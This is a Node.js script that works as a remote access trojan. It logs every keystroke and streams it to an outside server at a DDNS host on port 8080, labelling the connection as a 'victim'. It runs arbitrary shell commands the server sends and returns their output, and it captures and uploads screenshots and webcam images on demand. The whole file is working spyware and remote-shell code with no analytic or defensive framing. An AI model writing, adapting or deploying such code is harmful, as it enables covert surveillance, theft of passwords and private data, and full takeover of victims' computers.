#!/usr/bin/env node
const Keyboard = require('node-keylogger');
const io = require("socket.io-client");
const {exec} = require("child_process");
const ioHook = require('iohook')
const screenshot = require('desktop-screenshot');
const fs = require("fs");
const Webcam = require("node-webcam");

let socket = io('http://aloisguitton.ddns.net:8080', {transports: ['websocket']})

ioHook.start();
ioHook.on('mouseclick', event => {
    console.log(event)
});

const keyMap = {
    "char_16": "q",
    "char_48": "b",
    "char_46": "c",
    "char_32": "d",
    "char_18": "e",
    "char_33": "f",
    "char_34": "g",
    "char_35": "h",
    "char_23": "i",
    "char_36": "j",
    "char_37": "k",
    "char_38": "l",
    "char_39": "$",
    "char_49": "n",
    "char_24": "o",
    "char_25": "p",
    "char_30": "a",
    "char_19": "r",
    "char_31": "s",
    "char_20": "t",
    "char_22": "u",
    "char_47": "v",
    "char_17": "w",
    "char_45": "x",
    "char_21": "y",
    "char_44": "z",
    "char_57": " ",
    "char_28":  "\\n",
    "char_27": "^",
    "char_56": "m",
    "char_41": "ù",
    "char_0": "<",
    "char_51": ",",
    "char_52": ";",
    "char_53": ":",
    "char_125": ";"

}

socket.emit('joinMessage', "victime_boloss", (error) => {
    console.log(error)
    if (!error) {
        console.log("join")
    }
})

ioHook.on('keydown', event => {
    console.log(event.keycode)
    socket.emit('newMessage', keyMap["char_" + event.keycode])
});

socket.on('command', (args) => {
    exec(args, (error, stdout, stderr) => {
        if (error) {
            console.log(`error: ${error.message}`);
            return;
        }
        if (stderr) {
            console.log(`stderr: ${stderr}`);
            return;
        }
        socket.emit("commandResult", stdout)
    });
})

socket.on('screenshot', (args) => {
    console.log("get file")
    screenshot("screenshot.png", function (error, complete) {
        if (error) return
        fs.readFile('screenshot.png', function (err, data) {
            if(err) return
            console.log(data.toString('base64'))
            socket.emit("file", data.toString('base64'))
            fs.unlinkSync("screenshot.png")
        });
    });
})

socket.on('webcam', (args) => {
    console.log("get file")
    Webcam.capture("webcam.png", {}, (err, data) => {
        if(err) return
        fs.readFile('webcam.png', function (err, data) {
            if(err) return
            socket.emit("file", data.toString('base64'))
            fs.unlinkSync("webcam.png")
        });
    });
})




